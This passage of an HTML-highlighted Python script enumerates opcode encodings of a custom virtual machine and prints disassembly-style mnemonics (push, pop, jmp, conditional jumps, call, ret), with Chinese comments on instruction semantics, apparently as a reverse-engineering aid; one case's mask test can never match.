</span></span><span class=line><span class=cl>    <span class=n>machine_code</span> <span class=o>+=</span> <span class=s2>&#34;&#34;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=s2>&#34;</span><span class=si>%02X</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=n>X</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>machine_code</span> <span class=o>+=</span> <span class=s2>&#34; Y Y : &#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>out</span> <span class=o>=</span> <span class=n>machine_code</span> <span class=o>+</span> <span class=n>vm_type</span> <span class=o>+</span> <span class=s2>&#34;(&#34;</span> <span class=o>+</span> <span class=s2>&#34;DATA[&#34;</span> <span class=o>+</span> <span class=s2>&#34;YY&#34;</span><span class=o>+</span> <span class=s2>&#34;])&#34;</span> <span class=o>+</span> <span class=s2>&#34; = &#34;</span> <span class=o>+</span> <span class=n>vm_type</span> <span class=o>+</span> <span class=s2>&#34;(&#34;</span> <span class=o>+</span> <span class=n>reg_1</span> <span class=o>+</span> <span class=s2>&#34;)&#34;</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>out</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#####################################</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># opcode X</span>
</span></span><span class=line><span class=cl><span class=c1># case 7</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mh>0x1000</span><span class=p>,</span> <span class=mh>0x10000</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>op_code</span> <span class=o>=</span> <span class=n>i</span> <span class=o>&gt;&gt;</span> <span class=mi>8</span>
</span></span><span class=line><span class=cl>    <span class=n>X</span> <span class=o>=</span> <span class=n>i</span> <span class=o>&amp;</span> <span class=mh>0xff</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>op_code</span> <span class=o>&amp;</span> <span class=mh>0x1f</span><span class=p>)</span> <span class=o>!=</span> <span class=mh>0x17</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>continue</span>
</span></span><span class=line><span class=cl>    <span class=n>idx_1</span> <span class=o>=</span> <span class=p>(</span><span class=n>X</span> <span class=o>&amp;</span> <span class=mi>3</span><span class=p>)</span> <span class=o>*</span> <span class=mi>2</span> <span class=o>+</span> <span class=p>(</span><span class=n>op_code</span> <span class=o>&gt;&gt;</span> <span class=mi>7</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>idx_2</span> <span class=o>=</span> <span class=p>(</span><span class=n>X</span> <span class=o>&gt;&gt;</span> <span class=mi>2</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mi>7</span>
</span></span><span class=line><span class=cl>    <span class=n>idx_3</span> <span class=o>=</span> <span class=n>X</span> <span class=o>&gt;&gt;</span> <span class=mi>5</span>
</span></span><span class=line><span class=cl>    <span class=n>reg_1</span> <span class=o>=</span> <span class=s2>&#34;R&#34;</span> <span class=o>+</span> <span class=nb>str</span><span class=p>(</span><span class=n>idx_1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>reg_2</span> <span class=o>=</span> <span class=s2>&#34;R&#34;</span> <span class=o>+</span> <span class=nb>str</span><span class=p>(</span><span class=n>idx_2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>reg_3</span> <span class=o>=</span> <span class=s2>&#34;R&#34;</span> <span class=o>+</span> <span class=nb>str</span><span class=p>(</span><span class=n>idx_3</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>vm_type_arr</span> <span class=o>=</span> <span class=p>[</span><span class=s1>&#39;(int8)&#39;</span><span class=p>,</span><span class=s1>&#39;(int16)&#39;</span><span class=p>,</span><span class=s1>&#39;int(32)&#39;</span><span class=p>,</span><span class=s1>&#39;int(64)&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>vm_type_num</span> <span class=o>=</span> <span class=p>(</span><span class=n>op_code</span> <span class=o>&gt;&gt;</span> <span class=mi>5</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mi>3</span>
</span></span><span class=line><span class=cl>    <span class=n>vm_type</span> <span class=o>=</span> <span class=n>vm_type_arr</span><span class=p>[</span><span class=n>vm_type_num</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>machine_code</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=s2>&#34;</span><span class=si>%02X</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=n>op_code</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>machine_code</span> <span class=o>+=</span> <span class=s2>&#34; &#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>machine_code</span> <span class=o>+=</span> <span class=s2>&#34;&#34;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=s2>&#34;</span><span class=si>%02X</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=n>X</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>machine_code</span> <span class=o>+=</span> <span class=s2>&#34; : &#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>out</span> <span class=o>=</span> <span class=n>machine_code</span> <span class=o>+</span> <span class=s2>&#34;push &#34;</span> <span class=o>+</span> <span class=n>reg_1</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>out</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># opcode X Y</span>
</span></span><span class=line><span class=cl><span class=c1># case 7</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mh>0x1000</span><span class=p>,</span> <span class=mh>0x10000</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>op_code</span> <span class=o>=</span> <span class=n>i</span> <span class=o>&gt;&gt;</span> <span class=mi>8</span>
</span></span><span class=line><span class=cl>    <span class=n>X</span> <span class=o>=</span> <span class=n>i</span> <span class=o>&amp;</span> <span class=mh>0xff</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>op_code</span> <span class=o>&amp;</span> <span class=mh>0x1f</span><span class=p>)</span> <span class=o>!=</span> <span class=mh>0x07</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>continue</span>
</span></span><span class=line><span class=cl>    <span class=n>vm_type_arr</span> <span class=o>=</span> <span class=p>[</span><span class=s1>&#39;(int8)&#39;</span><span class=p>,</span><span class=s1>&#39;(int16)&#39;</span><span class=p>,</span><span class=s1>&#39;int(32)&#39;</span><span class=p>,</span><span class=s1>&#39;int(64)&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>vm_type_num</span> <span class=o>=</span> <span class=p>(</span><span class=n>op_code</span> <span class=o>&gt;&gt;</span> <span class=mi>5</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mi>3</span>
</span></span><span class=line><span class=cl>    <span class=n>vm_type</span> <span class=o>=</span> <span class=n>vm_type_arr</span><span class=p>[</span><span class=n>vm_type_num</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>idx_1</span> <span class=o>=</span> <span class=p>(</span><span class=n>X</span> <span class=o>&amp;</span> <span class=mi>3</span><span class=p>)</span> <span class=o>*</span> <span class=mi>2</span> <span class=o>+</span> <span class=p>(</span><span class=n>op_code</span> <span class=o>&gt;&gt;</span> <span class=mi>7</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>idx_2</span> <span class=o>=</span> <span class=p>(</span><span class=n>X</span> <span class=o>&gt;&gt;</span> <span class=mi>2</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mi>7</span>
</span></span><span class=line><span class=cl>    <span class=n>reg_1</span> <span class=o>=</span> <span class=s2>&#34;R&#34;</span> <span class=o>+</span> <span class=nb>str</span><span class=p>(</span><span class=n>idx_1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>reg_2</span> <span class=o>=</span> <span class=s2>&#34;R&#34;</span> <span class=o>+</span> <span class=nb>str</span><span class=p>(</span><span class=n>idx_2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>machine_code</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=s2>&#34;</span><span class=si>%02X</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=n>op_code</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>machine_code</span> <span class=o>+=</span> <span class=s2>&#34; &#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>machine_code</span> <span class=o>+=</span> <span class=s2>&#34;&#34;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=s2>&#34;</span><span class=si>%02X</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=n>X</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>machine_code</span> <span class=o>+=</span> <span class=s2>&#34; Y : &#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>out</span> <span class=o>=</span> <span class=n>machine_code</span> <span class=o>+</span> <span class=s2>&#34;push Y ; 这里的 Y 为8个字节的大小&#34;</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>out</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>##############</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># opcode X</span>
</span></span><span class=line><span class=cl><span class=c1># case 8</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mh>0x1000</span><span class=p>,</span> <span class=mh>0x10000</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>op_code</span> <span class=o>=</span> <span class=n>i</span> <span class=o>&gt;&gt;</span> <span class=mi>8</span>
</span></span><span class=line><span class=cl>    <span class=n>X</span> <span class=o>=</span> <span class=n>i</span> <span class=o>&amp;</span> <span class=mh>0xff</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>op_code</span> <span class=o>&amp;</span> <span class=mh>0xf</span><span class=p>)</span> <span class=o>!=</span> <span class=mh>0x8</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>continue</span>
</span></span><span class=line><span class=cl>    <span class=n>idx_1</span> <span class=o>=</span> <span class=p>(</span><span class=n>X</span> <span class=o>&amp;</span> <span class=mi>3</span><span class=p>)</span> <span class=o>*</span> <span class=mi>2</span> <span class=o>+</span> <span class=p>(</span><span class=n>op_code</span> <span class=o>&gt;&gt;</span> <span class=mi>7</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>reg_1</span> <span class=o>=</span> <span class=s2>&#34;R&#34;</span> <span class=o>+</span> <span class=nb>str</span><span class=p>(</span><span class=n>idx_1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>machine_code</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=s2>&#34;</span><span class=si>%02X</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=n>op_code</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>machine_code</span> <span class=o>+=</span> <span class=s2>&#34; &#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>machine_code</span> <span class=o>+=</span> <span class=s2>&#34;&#34;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=s2>&#34;</span><span class=si>%02X</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=n>X</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>machine_code</span> <span class=o>+=</span> <span class=s2>&#34; : &#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>out</span> <span class=o>=</span> <span class=n>machine_code</span> <span class=o>+</span> <span class=s2>&#34;pop &#34;</span> <span class=o>+</span> <span class=n>reg_1</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>out</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># opcode X Y Y</span>
</span></span><span class=line><span class=cl><span class=c1># case 0x9</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mh>0x1000</span><span class=p>,</span> <span class=mh>0x10000</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>op_code</span> <span class=o>=</span> <span class=n>i</span> <span class=o>&gt;&gt;</span> <span class=mi>8</span>
</span></span><span class=line><span class=cl>    <span class=n>X</span> <span class=o>=</span> <span class=n>i</span> <span class=o>&amp;</span> <span class=mh>0xff</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>op_code</span> <span class=o>&amp;</span> <span class=mh>0xf</span><span class=p>)</span> <span class=o>!=</span> <span class=mh>0x9</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>continue</span>
</span></span><span class=line><span class=cl>    <span class=n>machine_code</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=s2>&#34;</span><span class=si>%02X</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=n>op_code</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>machine_code</span> <span class=o>+=</span> <span class=s2>&#34; &#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>machine_code</span> <span class=o>+=</span> <span class=s2>&#34;&#34;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=s2>&#34;</span><span class=si>%02X</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=n>X</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>machine_code</span> <span class=o>+=</span> <span class=s2>&#34; Y Y : &#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>out</span> <span class=o>=</span> <span class=n>machine_code</span> <span class=o>+</span> <span class=s2>&#34;jmp YY&#34;</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>out</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># opcode X YY</span>
</span></span><span class=line><span class=cl><span class=c1># case 0xa</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mh>0x1000</span><span class=p>,</span> <span class=mh>0x10000</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>op_code</span> <span class=o>=</span> <span class=n>i</span> <span class=o>&gt;&gt;</span> <span class=mi>8</span>
</span></span><span class=line><span class=cl>    <span class=n>X</span> <span class=o>=</span> <span class=n>i</span> <span class=o>&amp;</span> <span class=mh>0xff</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>op_code</span> <span class=o>&amp;</span> <span class=mh>0xf</span><span class=p>)</span> <span class=o>!=</span> <span class=mh>0xa</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>continue</span>
</span></span><span class=line><span class=cl>    <span class=n>idx_1</span> <span class=o>=</span> <span class=p>(</span><span class=n>X</span> <span class=o>&amp;</span> <span class=mi>3</span><span class=p>)</span> <span class=o>*</span> <span class=mi>2</span> <span class=o>+</span> <span class=p>(</span><span class=n>op_code</span> <span class=o>&gt;&gt;</span> <span class=mi>7</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>idx_2</span> <span class=o>=</span> <span class=p>(</span><span class=n>X</span> <span class=o>&gt;&gt;</span> <span class=mi>2</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mi>7</span>
</span></span><span class=line><span class=cl>    <span class=n>idx_3</span> <span class=o>=</span> <span class=n>X</span> <span class=o>&gt;&gt;</span> <span class=mi>5</span>
</span></span><span class=line><span class=cl>    <span class=n>reg_1</span> <span class=o>=</span> <span class=s2>&#34;R&#34;</span> <span class=o>+</span> <span class=nb>str</span><span class=p>(</span><span class=n>idx_1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>reg_2</span> <span class=o>=</span> <span class=s2>&#34;R&#34;</span> <span class=o>+</span> <span class=nb>str</span><span class=p>(</span><span class=n>idx_2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>reg_3</span> <span class=o>=</span> <span class=s2>&#34;R&#34;</span> <span class=o>+</span> <span class=nb>str</span><span class=p>(</span><span class=n>idx_3</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>vm_type_arr</span> <span class=o>=</span> <span class=p>[</span><span class=s1>&#39;(int8)&#39;</span><span class=p>,</span><span class=s1>&#39;(int16)&#39;</span><span class=p>,</span><span class=s1>&#39;int(32)&#39;</span><span class=p>,</span><span class=s1>&#39;int(64)&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>vm_type_num</span> <span class=o>=</span> <span class=p>(</span><span class=n>op_code</span> <span class=o>&gt;&gt;</span> <span class=mi>5</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mi>3</span>
</span></span><span class=line><span class=cl>    <span class=n>vm_type</span> <span class=o>=</span> <span class=n>vm_type_arr</span><span class=p>[</span><span class=n>vm_type_num</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>machine_code</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=s2>&#34;</span><span class=si>%02X</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=n>op_code</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>machine_code</span> <span class=o>+=</span> <span class=s2>&#34; &#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>machine_code</span> <span class=o>+=</span> <span class=s2>&#34;&#34;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=s2>&#34;</span><span class=si>%02X</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=n>X</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>machine_code</span> <span class=o>+=</span> <span class=s2>&#34; Y Y: &#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>out</span> <span class=o>=</span> <span class=n>machine_code</span> <span class=o>+</span> <span class=s2>&#34;if &#34;</span> <span class=o>+</span> <span class=n>reg_2</span> <span class=o>+</span> <span class=s2>&#34; == &#34;</span> <span class=o>+</span> <span class=n>reg_3</span> <span class=o>+</span> <span class=s2>&#34; --&gt; jmp &#34;</span> <span class=o>+</span> <span class=s2>&#34;YY&#34;</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>out</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># opcode X YY</span>
</span></span><span class=line><span class=cl><span class=c1># case 0xb</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mh>0x1000</span><span class=p>,</span> <span class=mh>0x10000</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>op_code</span> <span class=o>=</span> <span class=n>i</span> <span class=o>&gt;&gt;</span> <span class=mi>8</span>
</span></span><span class=line><span class=cl>    <span class=n>X</span> <span class=o>=</span> <span class=n>i</span> <span class=o>&amp;</span> <span class=mh>0xff</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>op_code</span> <span class=o>&amp;</span> <span class=mh>0xf</span><span class=p>)</span> <span class=o>!=</span> <span class=mh>0xb</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>continue</span>
</span></span><span class=line><span class=cl>    <span class=n>idx_1</span> <span class=o>=</span> <span class=p>(</span><span class=n>X</span> <span class=o>&amp;</span> <span class=mi>3</span><span class=p>)</span> <span class=o>*</span> <span class=mi>2</span> <span class=o>+</span> <span class=p>(</span><span class=n>op_code</span> <span class=o>&gt;&gt;</span> <span class=mi>7</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>idx_2</span> <span class=o>=</span> <span class=p>(</span><span class=n>X</span> <span class=o>&gt;&gt;</span> <span class=mi>2</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mi>7</span>
</span></span><span class=line><span class=cl>    <span class=n>idx_3</span> <span class=o>=</span> <span class=n>X</span> <span class=o>&gt;&gt;</span> <span class=mi>5</span>
</span></span><span class=line><span class=cl>    <span class=n>reg_1</span> <span class=o>=</span> <span class=s2>&#34;R&#34;</span> <span class=o>+</span> <span class=nb>str</span><span class=p>(</span><span class=n>idx_1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>reg_2</span> <span class=o>=</span> <span class=s2>&#34;R&#34;</span> <span class=o>+</span> <span class=nb>str</span><span class=p>(</span><span class=n>idx_2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>reg_3</span> <span class=o>=</span> <span class=s2>&#34;R&#34;</span> <span class=o>+</span> <span class=nb>str</span><span class=p>(</span><span class=n>idx_3</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>vm_type_arr</span> <span class=o>=</span> <span class=p>[</span><span class=s1>&#39;(int8)&#39;</span><span class=p>,</span><span class=s1>&#39;(int16)&#39;</span><span class=p>,</span><span class=s1>&#39;int(32)&#39;</span><span class=p>,</span><span class=s1>&#39;int(64)&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>vm_type_num</span> <span class=o>=</span> <span class=p>(</span><span class=n>op_code</span> <span class=o>&gt;&gt;</span> <span class=mi>5</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mi>3</span>
</span></span><span class=line><span class=cl>    <span class=n>vm_type</span> <span class=o>=</span> <span class=n>vm_type_arr</span><span class=p>[</span><span class=n>vm_type_num</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>machine_code</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=s2>&#34;</span><span class=si>%02X</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=n>op_code</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>machine_code</span> <span class=o>+=</span> <span class=s2>&#34; &#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>machine_code</span> <span class=o>+=</span> <span class=s2>&#34;&#34;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=s2>&#34;</span><span class=si>%02X</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=n>X</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>machine_code</span> <span class=o>+=</span> <span class=s2>&#34; Y Y: &#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>out</span> <span class=o>=</span> <span class=n>machine_code</span> <span class=o>+</span> <span class=s2>&#34;if &#34;</span> <span class=o>+</span> <span class=n>reg_2</span> <span class=o>+</span> <span class=s2>&#34; != &#34;</span> <span class=o>+</span> <span class=n>reg_3</span> <span class=o>+</span> <span class=s2>&#34; --&gt; jmp &#34;</span> <span class=o>+</span> <span class=s2>&#34;YY&#34;</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>out</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># opcode X YY</span>
</span></span><span class=line><span class=cl><span class=c1># case 0xc</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mh>0x1000</span><span class=p>,</span> <span class=mh>0x10000</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>op_code</span> <span class=o>=</span> <span class=n>i</span> <span class=o>&gt;&gt;</span> <span class=mi>8</span>
</span></span><span class=line><span class=cl>    <span class=n>X</span> <span class=o>=</span> <span class=n>i</span> <span class=o>&amp;</span> <span class=mh>0xff</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>op_code</span> <span class=o>&amp;</span> <span class=mh>0xf</span><span class=p>)</span> <span class=o>!=</span> <span class=mh>0xc</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>continue</span>
</span></span><span class=line><span class=cl>    <span class=n>machine_code</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=s2>&#34;</span><span class=si>%02X</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=n>op_code</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>machine_code</span> <span class=o>+=</span> <span class=s2>&#34; &#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>machine_code</span> <span class=o>+=</span> <span class=s2>&#34;&#34;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=s2>&#34;</span><span class=si>%02X</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=n>X</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>machine_code</span> <span class=o>+=</span> <span class=s2>&#34; Y Y: &#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>out</span> <span class=o>=</span> <span class=n>machine_code</span> <span class=o>+</span> <span class=s2>&#34;call YY ;这里是函数调用指令，调用函数同时也会把下一条指令地址压入栈中，等价于 push next code , jmp YY&#34;</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>out</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># opcode</span>
</span></span><span class=line><span class=cl><span class=c1># case 0xd</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x100</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>op_code</span> <span class=o>=</span> <span class=n>i</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>op_code</span> <span class=o>&amp;</span> <span class=mh>0xf</span><span class=p>)</span> <span class=o>!=</span> <span class=mh>0xd</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>continue</span>
</span></span><span class=line><span class=cl>    <span class=n>machine_code</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=s2>&#34;</span><span class=si>%02X</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=n>op_code</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>machine_code</span> <span class=o>+=</span> <span class=s2>&#34; : &#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>out</span> <span class=o>=</span> <span class=n>machine_code</span> <span class=o>+</span> <span class=s2>&#34;ret ;这里是函数return指令，等价于 pc = stack[stack_pc] , stack_pc ++&#34;</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>out</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># opcode X</span>
</span></span><span class=line><span class=cl><span class=c1># case 0xe</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mh>0x1000</span><span class=p>,</span> <span class=mh>0x10000</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>op_code</span> <span class=o>=</span> <span class=n>i</span> <span class=o>&gt;&gt;</span> <span class=mi>8</span>
</span></span><span class=line><span class=cl>    <span class=n>X</span> <span class=o>=</span> <span class=n>i</span> <span class=o>&amp;</span> <span class=mh>0xff</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>op_code</span> <span class=o>&amp;</span> <span class=mh>0xf</span><span class=p>)</span> <span class=o>!=</span> <span class=mh>0x1e</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>continue</span>
</span></span><span class=line><span class=cl>    <span class=n>machine_code</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=s2>&#34;</span><span class=si>%02X</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=n>op_code</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>machine_code</span> <span class=o>+=</span> <span class=s2>&#34; &#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>machine_code</span> <span class=o>+=</span> <span class=s2>&#34;&#34;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=s2>&#34;</span><span class=si>%02X</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=n>X</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>machine_code</span> <span class=o>+=</span> <span class=s2>&#34; : &#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>out</span> <span class=o>=</span> <span class=n>machine_code</span> <span class=o>+</span> <span class=s2>&#34;call field_A8[R0] ; 只有当 R0&gt;=0 且 R0 &lt;= 3 执行 field_A8处开始的四个函数的值，这四个函数在main 中被赋值到 field_A8 开始的指针&#34;</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>out</span><span class=p>)</span>
